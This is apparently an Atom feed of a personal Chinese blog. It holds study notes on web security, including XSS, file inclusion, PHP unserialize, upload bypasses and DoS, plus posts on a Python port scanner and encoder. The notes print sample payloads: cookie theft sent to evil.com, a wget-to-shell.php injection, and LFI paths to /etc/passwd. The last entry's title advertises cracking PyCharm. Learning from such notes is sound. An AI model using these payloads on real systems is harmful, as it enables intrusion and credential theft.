<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ggy的个人博客</title>
  
  <subtitle>hello,world.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://ggyggy666.github.io/"/>
  <updated>2020-02-07T16:33:17.749Z</updated>
  <id>https://ggyggy666.github.io/</id>
  
  <author>
    <name>ggy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>读《白帽子讲web安全》的收获(四)</title>
    <link href="https://ggyggy666.github.io/2020/02/07/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E5%9B%9B)/"/>
    <id>https://ggyggy666.github.io/2020/02/07/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E5%9B%9B)/</id>
    <published>2020-02-07T14:45:31.000Z</published>
    <updated>2020-02-07T16:33:17.749Z</updated>
    
    <content type="html"><![CDATA[<p>紧接着上次所发的文章</p><a id="more"></a><p>这次带来的是收获（四）。</p><p><img src="https://pic.downk.cc/item/5e3585b22fb38b8c3c404c16.jpg" alt></p><hr><ul><li><h1 id="应用层拒绝服务攻击"><a href="#应用层拒绝服务攻击" class="headerlink" title="应用层拒绝服务攻击"></a>应用层拒绝服务攻击</h1></li></ul><hr><h2 id="TCP三次握手："><a href="#TCP三次握手：" class="headerlink" title="TCP三次握手："></a>TCP三次握手：</h2><blockquote><ol><li>客户端向服务端发送一个SYN包，包含客户端使用的端口号和初始序列x;  </li><li>服务端收到SYN后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认后x+1和服务器端的初始序列y;  </li><li>客户端收到SYN+ACK报文后，向服务端返回一个确认号为y+1,序号为x+1的ACK报文。</li></ol></blockquote><h2 id="DDOS攻击："><a href="#DDOS攻击：" class="headerlink" title="DDOS攻击："></a>DDOS攻击：</h2><blockquote><ol><li>伪造大量的源IP地址，向服务器端发送大量的SYN包。</li><li>服务器端返回SYN+ACK包，但是IP是伪造的，没有应答，它就会重试3-5次，并且等待一个SYNTime(30s-2min)。</li><li>超时服务器端丢弃这个链接。由于这种请求是大量的，无暇处理正常请求，导致拒绝服务。</li></ol></blockquote><h2 id="资源耗尽攻击（Slowloris攻击）"><a href="#资源耗尽攻击（Slowloris攻击）" class="headerlink" title="资源耗尽攻击（Slowloris攻击）"></a>资源耗尽攻击（Slowloris攻击）</h2><blockquote><ol><li>Web Server对于并发的连接数有一定的上限。以极低的速度向服务器发送HTTP请求，就会恶意占用连接，导致服务器无法接受新的请求，从而导致拒绝服务。   </li><li>正常的HTTP头是以\r\n\r\n结尾的，比如：<code>Content-Length:42\r\n\r\n</code>。可以构造不完整的HTTP请求：</li></ol></blockquote><pre><code>GET / HTTP/1.1\r\nHOST: host\r\nUser-Agent:Mozilla\r\n</code></pre><p>只有一个\r\n,服务端会任务HTTP Headers部分没有结束，就会保持连接不释放。或者可以指定一个非常大的Content-Length的值，然后以一种极低的速度发包。</p><h2 id="Server-Limit-DOS"><a href="#Server-Limit-DOS" class="headerlink" title="Server Limit DOS"></a>Server Limit DOS</h2><blockquote><ol><li>Web Server对HTTP包头都有长度限制。Apache默认最大是8192字节（Request Header)。超过这个限制就会返回错误。</li><li>通过xss攻击，往客户端写入一个超长的cookie，那么该客户端在清除cookie之前无法访问该域所在的任何页面。POC如下：</li></ol></blockquote><pre><code>&lt;script language=&quot;javascript&quot;&gt;alert(&apos;document.cookie&apos;);var metastr=&quot;AAAAAAAAAA&quot;;  //10个Avar str=&quot;&quot;;``while(str.length&lt;4000){    str += metastr;}alert(str.length);document.cookie = &quot;evil13=&quot; + &quot;\&lt;script\&gt;alert(xss)\&lt;\/script\&gt;&quot; + &quot;;expires=Thu,18-Apr-2019 08:37:43 GMT;&quot;;document.cookie = &quot;evil1=&quot; + str + &quot;;expires=Thu,18-Apr-2019 08:37:43 GMT;&quot;;document.cookie = &quot;evil2=&quot; + str + &quot;;expires=Thu,18-Apr-2019 08:37:43 GMT;&quot;;alert(document.cookie)</code></pre><h2 id="正则：ReDos"><a href="#正则：ReDos" class="headerlink" title="正则：ReDos"></a>正则：ReDos</h2><blockquote><ol><li>正则表达式是基于NFA（Nondeterministic Finite Automaton)的。它是一个状态机，对于每个状态和输入符号都可能有许多下一个状态，让会遍历所有状态，不停尝试下一个状态，直到匹配到为止。</li><li>比如：<code>^(a+)+$</code> ,当输入aaaaX时，只有16种状态的尝试，很快可以遍历完。但输入的是：aaaaaaaaaaaaaaaaX,共有65536中可能。大大增加了正则引擎解析的消耗。</li></ol></blockquote><hr><ul><li><h1 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h1></li></ul><hr><h2 id="文件包含漏洞："><a href="#文件包含漏洞：" class="headerlink" title="文件包含漏洞："></a>文件包含漏洞：</h2><blockquote><ol><li>常见的导致文件包含的函数：<blockquote><p> PHP: include(), include_once(), require(), require_once(), fopen(), readfile()…<br> JSP/Servlet: ava.io.File(), java.io.FileReader()…<br> ASP: include file, include virtual…  </p></blockquote></li></ol></blockquote><blockquote><ol start="2"><li>本地文件包含：<br>？file = ../../../etc/passwd，绕过姿势：<blockquote><blockquote><p> 0字节截断：%00,\0<br> 长度绕过：如：///////abc, ./././././abc, ../1/abc/../1/abc/../1/abc<br> .(%2e) ==&gt;/(%2f）==&gt;  \(%5c) ==&gt; /(%c0%af) ==&gt; \(%c1%9c) </p></blockquote></blockquote></li></ol></blockquote><blockquote><blockquote><p>  本地文件包含后执行PHP代码：  </p><blockquote><ol><li>包含用户上传的文件</li><li>包含data:// 或 php://input 等伪协议</li><li>包含session文件</li><li>包含日志文件，比如Web Server 的access log<br>Apache:读取httpd的配置文件httpd.conf,找到日志文件所在的目录。httpd.conf一般在Apache的安装目录下，也可能为：/etc/httpd/conf/httpd.conf, 自定义安装的可能在：/usr/local/apache/conf/httpd.conf</li><li>包含/proc/self/environ文件<br>?page=../../../../proc/self/environ,在user-Agent中注入：<code>&lt;?php system(&#39;wget http://xxx.com/xxx.txt -O shell.php)&#39;?&gt;</code></li><li>包含上传的临时文件（RFC1867）<br>PHP会为上传文件创建临时文件，目录在php.ini的upload_tmp_dir中定义，Linux下使用/tmp目录，Windows下使用C:\windows\temp目录。但文件名随机，可暴力破解。</li><li>包含其他应用创建的文件，比如数据库文件，缓存文件，应用日志等。</li></ol></blockquote></blockquote></blockquote><blockquote><ol start="3"><li>远程文件包含<blockquote><p> allow_url_include = ON</p></blockquote></li></ol></blockquote><h2 id="变量覆盖漏洞："><a href="#变量覆盖漏洞：" class="headerlink" title="变量覆盖漏洞："></a>变量覆盖漏洞：</h2><blockquote><p>  全局变量覆盖  </p><blockquote><p>  register_globals = ON<br>  xxx.php?GLOBALS[a]=1&amp;b=2</p></blockquote></blockquote><blockquote><p>  extract()变量覆盖</p><blockquote><p> ?auth=1</p></blockquote></blockquote><blockquote><p>  import_request_variables变量覆盖</p><blockquote><p>  ?auth=1</p></blockquote></blockquote><blockquote><p>  parse_str()变量覆盖</p></blockquote><h2 id="代码执行漏洞："><a href="#代码执行漏洞：" class="headerlink" title="代码执行漏洞："></a>代码执行漏洞：</h2><blockquote><p>  危险函数：popen(),system(),passthru(),exec(),eval()等<br>  执行代码方式：</p><blockquote><p> 直接执行代码：eval,assert,system,exec,shell_exec,passthru,escapeshellcmd,pcntl_exec<br> 文件包含：include,include_once,requier,equire_once<br> 本地文件写入：file_put_contents,fwrite,fputs<br> preg_replace(): 需要\e<br> 动态函数执行：create_function<br> Curly Syntax,执行花括号间的代码，并将结果替换回去。<br> 回调函数执行：很多，注意ob_start()<br> unserialize()：能将序列化的数据重新映射为PHP变量  </p><blockquote><p> 执行条件：  </p><ol><li>unserialize()的参数用户可以控制，构造成需要反序列化的数据结构；  </li><li>存在_destruct()函数或者_wakeup函数。可以通过unserialize()控制_destruct()和_wakeup()函数的输入.</li></ol></blockquote></blockquote></blockquote><pre><code>&lt;?phpclass Example {    var $var=&apos;&apos;;    function _destruct() {        eval($this-&gt;var);    }}unserialize($_GET[&apos;saved_code&apos;]);?&gt;</code></pre><blockquote><blockquote><blockquote><p> 攻击payload：<br> <code>https://xxx.com/xxx.php?saved_code=0:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}</code><br> 攻击payload可以先模仿目标代码的实现过程，再通过调用serialize()获得。</p></blockquote></blockquote></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;紧接着上次所发的文章&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="读《白帽子讲web安全》的收获(四)" scheme="https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E5%9B%9B/"/>
    
  </entry>
  
  <entry>
    <title>读《白帽子讲web安全》的收获(三)</title>
    <link href="https://ggyggy666.github.io/2020/02/06/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%B8%89)/"/>
    <id>https://ggyggy666.github.io/2020/02/06/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%B8%89)/</id>
    <published>2020-02-06T13:34:56.000Z</published>
    <updated>2020-02-06T14:26:47.350Z</updated>
    
    <content type="html"><![CDATA[<p>紧接着上次所发的文章</p><a id="more"></a><p>这次带来的是收获（二）。</p><p><img src="https://pic.downk.cc/item/5e3585b22fb38b8c3c404c16.jpg" alt></p><hr><ul><li><strong>认证与会话管理</strong></li></ul><hr><p>认证是为了认出用户是谁，授权决定了用户能做什么。</p><pre><code>- 彩虹表  收集明文与明文对应的MD5值  - SessionId  可能在cookie中也可能在URL中，如果是在URL中，可以通过referer泄露出来。例如：    1. 发送到QQ邮箱的邮件中引用了一张外部网站的图片：    &lt;img src=&quot;https://xxx.com/xxx.jpg&gt;    2. 打开QQ邮箱查看邮件，会解析图片，这个过程相当于发起来一次GET请求，抓包查看Referer，QQ邮箱的sid就泄露了。  - Session Fixation    A将某个SessionID放到URL中，B点击了，B就以这个SessionID登录了。如果SessionID没有被重写，那么A可以修改它自己的SessionID为刚才B登录的那个，就能登录进去B的账号。</code></pre><hr><ul><li><strong>访问控制</strong></li></ul><hr><pre><code>- 垂直权限与水平权限- OAuth  Jane 想将qq的图片分享到朋友圈。那么他在朋友圈中，选择要从qq中获取图片，朋友圈的后台就会创建一个临时凭证，然后去访问QQ。跳转到QQ后，要求登录（是在QQ中登录），登录成功后，QQ询问Jane是否授权，授权成功，QQ将Jane带来的临时凭证标记为已经授权，再跳转回朋友圈。  </code></pre><hr><ul><li><strong>加密算法与随机数</strong></li></ul><hr><pre><code>- 加密算法  1. 分组加密       分成一些长度不同的组，分别加密。有AES，DES等，为CBC模式  2. 流密码加密       每次只处理一个字节，密钥独立于消息之外，两者通过异或实现。有RC4、ORYX、SEAL等。  3. ECB模式       改变分组密文的顺序，明文顺序也会被改变；替换某个密文，某个明文也会被改变，其它都不变。       如：密文对应的明文为：xxx &amp; pay = 10000 ，将1.0对应的密文替换10000对应的密文，就可以一块钱买东西了。- 时间不随机       密码是通过获取当前系统的时间得到的，如果是调用microtime（）函数，再去MD5加密后的密文，通过遍历microtime()的值就可破解：获取当前系统时间，以此为基数，依次递增。</code></pre><hr><ul><li><strong>web框架安全</strong></li></ul><hr><pre><code>- MVC框架    view层：负责用户视图、页面展示等    controller层：接收view层传入的用户请求    model层：实现模型，完成数据的处理</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;紧接着上次所发的文章&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="读《白帽子讲web安全》的收获(三)" scheme="https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E4%B8%89/"/>
    
  </entry>
  
  <entry>
    <title>读《白帽子讲web安全》的收获(二)</title>
    <link href="https://ggyggy666.github.io/2020/02/01/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%BA%8C)/"/>
    <id>https://ggyggy666.github.io/2020/02/01/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%BA%8C)/</id>
    <published>2020-02-01T12:45:51.000Z</published>
    <updated>2020-02-01T14:21:25.236Z</updated>
    
    <content type="html"><![CDATA[<p>紧接着上次所发的文章</p><a id="more"></a><p>这次带来的是收获（二）。</p><p><img src="https://pic.downk.cc/item/5e3585b22fb38b8c3c404c16.jpg" alt></p><hr><ul><li><strong>CSRF</strong></li></ul><hr><pre><code>- P3P头运行跨域访问隐私数据- 对于POST请求，可以在某一个网站的html页面构造表单，利用js自动提交表单</code></pre><hr><ul><li><strong>点击劫持</strong></li></ul><hr><pre><code>- 利用iframe的hidden属性隐藏页面，使得用户在不知情下点击- 利用图片覆盖- 利用拖拽数据- 利用Flash（如弄一个小游戏）- 攻击者可能将恶意代码保存在**webstorage**中，实现跨页面攻击</code></pre><hr><ul><li><strong>注入</strong></li></ul><hr><pre><code>- SOL注入      注册admin（后面55个空格），可以修改管理员密码- xml注入       &lt;?xml version=&quot;1.0&quot; ?&gt;    &lt;!DOCTYPE test [    &lt;!ENTITY % system &quot;&quot;&gt;    ]&gt;- 代码注入       1. eval, system等函数    2. ?test=dd 后面直接加;然后加命令，如：      `?arg=1;phpinfo()`  - CRLF注入      http头没有过滤\r\n,导致可以添加HTTP头中的参数，可使用%0d%0a%0d%0a,后面再加payload，如：    ?email=%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1</code></pre><hr><ul><li><strong>文件上传漏洞</strong></li></ul><hr><pre><code>- 使用0字节阶段      如：只允许上传JPG图片，那么可以构造文件名后缀：xxx.php[\0].JPG- 将正常图片和PHP文件合并      检测图片的文件开头，那么可以将PHP文件合并到图片的尾部- 利用apache文件解析漏洞      Apache对于文件名的解析是从后往前的，如果仅仅检测是否为rar文件，那么可以将一个PHP文件命名为：xxx.php.rar.rar  - 利用IIS文件解析问题    使用;截断，如：abc.asp;xx.jpg 会被检测为 abc.asp。      处理文件拓展名出错：/path/xyz.asp/abc.jpg 会将xyz.asp目录下的所有文件都作为ASP文件解析，比如这个abc.jpg就会被认为是ASP类型的。原因就是因为目录名有.asp。      以上的两个漏洞，都需要文件确实存在，如那个xxx.jpg。如果能够控制更改文件目录的名字就可以改为.asp了。- PHP CGI路径解析问题    访问.../path/test.jpg/noexisten.php时,会把test.jpg当    做PHP文件执行，而noexisten.php是不存在的。因此如果上传的图片内容是php文件类型的，然后在访问这个图片的URL链接后面加上/xxx.php就可以把它当做PHP执行，从而执行里面的代码。- 利用上传文件钓鱼      如果是普通的钓鱼可能容易被发现URL的不一致。那么可以在正规网站上传图片，图片内容可以导向钓鱼网站，这样用户就会以为打开的只是一个正常图片。比如：      1.  上传了一张图片，地址为：http://.../uploads/xxx.jpg    2. 而图片内容是：      png(正常的图片开头，绕过某些检测）        &lt;script language=&quot;javascript:&quot;&gt;      var c = window.location.tostring();    if(c.indexof(&quot;?&quot;) != -1 {    var i = c.split(&quot;?&quot;)[1];    if(i.split(&quot;_&quot;)[0]==1) {        location.href = &apos;http://evil.com/xxx.asp?id=&apos; + i.split(&quot;_&quot;)[1];    else {        location.href = &apos;http://evil.com/xxx.asp?id=&apos; + i.split(&quot;_&quot;)[1];    }    }    &lt;/script&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;紧接着上次所发的文章&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="读《白帽子讲web安全》的收获(二)" scheme="https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E4%BA%8C/"/>
    
  </entry>
  
  <entry>
    <title>GG转码器</title>
    <link href="https://ggyggy666.github.io/2020/01/31/GG%E8%BD%AC%E7%A0%81%E5%99%A8/"/>
    <id>https://ggyggy666.github.io/2020/01/31/GG%E8%BD%AC%E7%A0%81%E5%99%A8/</id>
    <published>2020-01-31T12:06:45.000Z</published>
    <updated>2020-01-31T12:22:01.212Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习了如何使用python编写一款转码器。</p><a id="more"></a><p>虽然转码可以使用在线网站或者burp的转码功能，但我更喜欢直接点开一个软件使用，何况还是自己敲出来的。虽然看起来是比较简陋了点。。。</p><hr><h2 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a><strong>使用效果</strong></h2><p><strong>输入要编码的字符，再点击“转码”</strong><br><img src="https://pic.downk.cc/item/5e3419442fb38b8c3c210541.jpg" alt></p><p>可以看到在对应的输入框中都输出了编码后相应的字符。也可以<strong>点击每一个输入框后面的“解码”按钮</strong>进行解码，如：<br><img src="https://pic.downk.cc/item/5e3419be2fb38b8c3c211147.jpg" alt><br>当然也可以<strong>在每一个输入框中输入想要编码的字符串然后点击“编码”按钮</strong>：<br><img src="https://pic.downk.cc/item/5e341a702fb38b8c3c2122dc.jpg" alt><br>我把它放到了<a href="https://github.com/ggyggy666/ggyggy666.github.io/releases/tag/1.2" target="_blank" rel="noopener">我的GitHub</a>上，有兴趣的可以去看看。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天学习了如何使用python编写一款转码器。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="https://ggyggy666.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="GG转码器" scheme="https://ggyggy666.github.io/tags/GG%E8%BD%AC%E7%A0%81%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>读《白帽子讲web安全》的收获(一)</title>
    <link href="https://ggyggy666.github.io/2020/01/30/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%B8%80)/"/>
    <id>https://ggyggy666.github.io/2020/01/30/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%B8%80)/</id>
    <published>2020-01-30T13:37:30.000Z</published>
    <updated>2020-02-01T14:07:20.452Z</updated>
    
    <content type="html"><![CDATA[<p>从放假就开始看的《白帽子讲web安全》终于（粗略地）看完了，在此简单总结一下收获。</p><a id="more"></a><p>本篇为收获（一）。 </p><p><img src="https://pic.downk.cc/item/5e3585b22fb38b8c3c404c16.jpg" alt></p><ul><li>安全问题就是<strong>信任</strong>问题</li></ul><hr><ul><li><strong>设计安全方案的技巧</strong>  </li></ul><hr><pre><code>- Secure By Default原则      1. 黑名单、白名单      2. 最小权限原则- 纵深防御原则（不同层面都要考虑周全）  - 数据与代码分离原则- 不可预测性原则</code></pre><hr><ul><li><strong>同源策略</strong>  </li></ul><hr><p>a.com加载了b.com的js,这个js就是运行在a.com中的了，所以其Origin就应该是a.com。<br>可通过检测HTTP头，采用CSP。（返回头中含 X-Content-Security-Policy:…)  </p><hr><ul><li><strong>xss</strong>  </li></ul><hr><p>实质：将用户的输入当成代码执行了。 </p><pre><code>- 窃取cookie    1. 先加载一个脚本</code></pre><p><code>http://www.aaa.com/test.html?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</code></p><pre><code>    2. 在远程脚本（evil.com中的evil.js)输入：           var img = document.getElement(&quot;img&quot;)         img.src = &quot;http://www.evil.com/log?&quot;+escape(document.cookie);          document.body.appendChild(img);    通过向页面插入了一张看不见的图片，盗取cookie（有httponly就不行了）  - 构造GET和POST请求  上面的第2点中的代码就是一个GET请求。  POST请求可以使用form表单，或者直接写HTML代码，或者通过XmlHttpRequeste发送（使用ajax）</code></pre><p><img src="https://pic.downk.cc/item/5e32fb452fb38b8c3c09484b.jpg" alt> </p><pre><code>- 根据浏览器特有标识识别浏览器、还可识别用户安装的软件- 通过CSS，访问过某个网站，颜色会不同 - xss构造技巧     1. 字符编码          输入被&quot;&quot;包着，对双引号进行\转义，可以用%c1&quot;,因为%c1与\组成新字符，把\吃掉      2. 绕过长度限制          - 利用location.hash        可以输入&quot; onclick=&quot;eval(location.hash.substr(1))&quot;/ ,然后再URL中后面输入#alert(1)          - 利用注释符        对于可控的多行输入，在第一行输入：&quot;&gt;&lt;!-- ,在后面一行输入：--&gt;&lt;script&gt;alert(1)&lt;/script&gt;        - 利用window.name        在a.com中对window.name赋值，然后导向b.com中，那么b.com中的window.name是同一个。          &lt;script&gt;         window.name = &quot;alert(document.cookie)&quot;;        location.href = &quot;http://www.xsstest/xss.php&quot;;        &lt;/script&gt;        再在定向到的www.xsstest/xss.php中写入：eval(name);        - xss回旋镖        B上存在反射型xss,A上存在存储型xss,可以在A上的xss中嵌入B的xss。           在A上写一个form表单，自动提交到B，B中再跳转回A。    3.Dom型xss重点关注        1. 所有inputs框        2. window.location(href,hash等)        3. window.name        4. document.referer        5. document.cookie        6. localstorage        7. XMLHttpRequest返回的数据</code></pre><p>- </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从放假就开始看的《白帽子讲web安全》终于（粗略地）看完了，在此简单总结一下收获。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="读《白帽子讲web安全》的收获(一)" scheme="https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E4%B8%80/"/>
    
  </entry>
  
  <entry>
    <title>端口扫描工具的编写</title>
    <link href="https://ggyggy666.github.io/2020/01/22/%E4%BD%BF%E7%94%A8python%E7%BC%96%E5%86%99%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
    <id>https://ggyggy666.github.io/2020/01/22/%E4%BD%BF%E7%94%A8python%E7%BC%96%E5%86%99%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</id>
    <published>2020-01-22T13:39:46.312Z</published>
    <updated>2020-01-25T01:10:57.435Z</updated>
    
    <content type="html"><![CDATA[<p>新的一年就要到来了，我的博客也该更新了。  </p><a id="more"></a><p>今天又是一个大好的日子。我学会了如何使用python编写一个简单的端口扫描工具，收获颇多，特来分享。<br>所谓“万事开头难”，因此在开始进行编写之前，我们首先得理清一下编写这样一个工具需要的流程是什么。   </p><blockquote><ol><li>根据工具名便可以判断出，我们需要使用一些python自带的库来进行端口的扫描。  </li><li>一个机器的端口有很多，我们需要循环去判断它是否开放。如果一个一个的去扫，势必要花费很多时间，因此需要使用多线程来达到减少运行时间的目的。   </li></ol></blockquote><p>理清了这样一条思路，我们便可以一步步地去实现它。  </p><hr><h2 id="利用socket库实现TCP端口扫描"><a href="#利用socket库实现TCP端口扫描" class="headerlink" title="利用socket库实现TCP端口扫描  "></a><strong>利用socket库实现TCP端口扫描</strong>  </h2><p>要想利用socket库，首先得了解一下它的用法。<a href="https://www.runoob.com/python/python-socket.html" target="_blank" rel="noopener">菜鸟教程</a>里有它的完整使用方法，可自行了解。讲一下我们将要用到的socket函数。首先是： </p><p><code>socket.socket([family[, type[, proto]]])</code>  </p><p>socket又称“套接字”，从上面便可以看出。但其实上面那行代码并不好理解，因此可以换成另一种形式： </p><p><code>socket(int domain, int type, int protocol)</code>   </p><p>看看它们各自都代表了什么：   </p><ul><li>domain：协议域，又称协议族（family），可以是AF_UNIX或AF_INET（使用32位的ipv4地址和16位的端口号组合）或AF_INET6等。  </li><li>type：知道socket类型。常用的有面向连接的SOCK_STREAM和面向非连接的SOCK_DGRAM。  </li><li>protocol，一般不填默认为0。</li></ul><p>具体信息可以看<a href="https://www.cnblogs.com/wangcq/p/3520400.html" target="_blank" rel="noopener">这篇文章</a>,我们要用到面向连接的ipv4地址进行扫描，因此socket函数就可以是：  </p><p><code>client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</code>   </p><p>将这个函数对象赋给client（客户端），然后使用这个对象进行连接：  </p><p><code>client.connect((target, port))</code>   </p><p>注意connect中的数据类型是元组类型。target即为ipv4地址，port为要扫描的端口。这便是进行了一次扫描，然后将结果打印出来，最后需要用close()关闭。（可以将它想象成对一个文件的操作）<br>封装成一个portscan函数：<br><img src="https://pic.downk.cc/item/5e2b951f2fb38b8c3c701f89.jpg" alt><br>这里还使用了try-except，以防程序产生异常后就退出。  </p><hr><h2 id="使用多线程运行扫描函数"><a href="#使用多线程运行扫描函数" class="headerlink" title="使用多线程运行扫描函数 "></a><strong>使用多线程运行扫描函数</strong> </h2><p>要使用到多线程，就需要用到python库中的Thread库。它的具体用法可以查看<a href="https://www.cnblogs.com/tkqasn/p/5700281.html" target="_blank" rel="noopener">苍松的博客</a>。<br>我们这里用到只是它的最简单的用法。</p><p><code>Thread(group=None, target=None, name=None, args=(), kwargs={})</code>  </p><p>上面的是完整的函数参数，只关注我们需要的即可。这里的target不是上文中提到的需要扫描的ipv4地址，而是要执行的方法（函数），可以填入我们的portscan。然后后面的args参数值就填传入的参数，即ipv4地址和端口。 </p><p><code>t = Thread(target=portscan, args=(target, port))</code> </p><p>注意target的参数值只需要填函数名，不用()，args的参数值一样需要是元组类型。然后使用：  </p><p><code>t.start()</code>  </p><p>来启动线程。由于我们需要遍历端口观察它是否开放，因此可以将启动多线程这步放到一个遍历端口的循环中。这里只遍历到1024端口。<br><img src="https://pic.downk.cc/item/5e2b95492fb38b8c3c702269.jpg" alt><br>为了方便扫描，ipv4地址需要自己输入，然后传入main函数中。还可以使用time库计算处运行所需的时间。<br><img src="https://pic.downk.cc/item/5e2b955c2fb38b8c3c70239f.jpg" alt><br>不要忘了导入所需要用到的库哦。<br><img src="https://pic.downk.cc/item/5e2b95722fb38b8c3c70252f.jpg" alt>   </p><hr><h2 id="最终效果如下："><a href="#最终效果如下：" class="headerlink" title="最终效果如下："></a><strong>最终效果如下：</strong></h2><p><img src="https://pic.downk.cc/item/5e2b95932fb38b8c3c7027e2.jpg" alt><br>端口扫描工具就这样做好啦！虽然看起来简单，代码很少，但是还是需要动手去实现才能体会到其中艰难，才会更有效果。对了，忘记提一句。这里的ipv4地址是我本机的地址，可以通过： </p><p><code>win+R -&gt; 输入cmd -&gt; 输入ipconfig -&gt;查看‘无线局域网适配器 WLAN:’的IPv4地址</code>   </p><p>得到。当然，扫描域名也是可以的。打包后的代码放到了<a href="https://github.com/ggyggy666/ggyggy666.github.io/releases/tag/1.1" target="_blank" rel="noopener">我的github</a>上。<br>今天就到这里了，期待下一次能学到更多有趣的东西。  </p><hr><h2 id="扫描下方的二维码，更多精彩文章等你来看哦。"><a href="#扫描下方的二维码，更多精彩文章等你来看哦。" class="headerlink" title="扫描下方的二维码，更多精彩文章等你来看哦。 "></a><code>扫描下方的二维码，更多精彩文章等你来看哦。</code> </h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;新的一年就要到来了，我的博客也该更新了。  &lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://ggyggy666.github.io/categories/python/"/>
    
    
      <category term="使用pycharm编写简单的端口扫描工具" scheme="https://ggyggy666.github.io/tags/%E4%BD%BF%E7%94%A8pycharm%E7%BC%96%E5%86%99%E7%AE%80%E5%8D%95%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>永久破解pycharm2019-2.3的方法</title>
    <link href="https://ggyggy666.github.io/2020/01/16/%E6%B0%B8%E4%B9%85%E7%A0%B4%E8%A7%A3pycharm2019-2.3%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://ggyggy666.github.io/2020/01/16/%E6%B0%B8%E4%B9%85%E7%A0%B4%E8%A7%A3pycharm2019-2.3%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2020-01-15T16:11:09.000Z</published>
    <updated>2020-01-25T01:07:56.353Z</updated>
    
